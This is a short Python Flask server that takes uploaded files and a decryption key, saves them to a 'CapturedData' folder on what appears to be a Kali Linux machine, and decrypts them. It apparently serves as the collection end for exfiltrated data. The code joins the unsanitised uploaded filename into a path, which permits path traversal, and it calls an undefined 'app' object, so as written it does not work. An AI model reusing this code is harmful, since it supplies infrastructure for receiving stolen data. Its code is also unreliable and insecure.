from flask import Flask, request, render_template
import os
from cryptography.fernet import Fernet # file decryption

server = Flask(__name__) # create instance of flask app
UPLOAD_FOLDER = '/home/kali/Desktop/CapturedData'
server.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

def decrypt_file(file_path, key):
    fernet = Fernet(key)
    try:
        with open(file_path, 'rb') as file:
            encrypted_data = file.read()
        decrypted_data = fernet.decrypt(encrypted_data)
        with open(file_path, 'wb') as file:
            file.write(decrypted_data)
        print(f"File '{file_path}' decrypted successfully.")
        return True
    except Exception as e:
        print(f"Failed to decrypt file '{file_path}': {e}")
        return False

@server.route('/')
def server_test():
    return render_template('index.html')

@server.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files or 'key' not in request.form:
        return 'No file or key provided', 400 # bad request
    file = request.files['file']
    key = request.form['key'].encode()  # convert key to bytes

    if file.filename == '':
        return 'No selected file', 400 # file selection
    if file:
        filename = file.filename # get filename
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename) # create full path for upload
        file.save(file_path) # save file
        if decrypt_file(file_path, key): # decrypt file
            return 'File uploaded and decrypted successfully', 200 # okay
        else:
            return 'Error decrypting file', 500 # server error

if __name__ == '__main__':
    if not os.path.exists(UPLOAD_FOLDER):
        os.makedirs(UPLOAD_FOLDER)
    server.run(host='0.0.0.0', port=5000) # makes server accessible
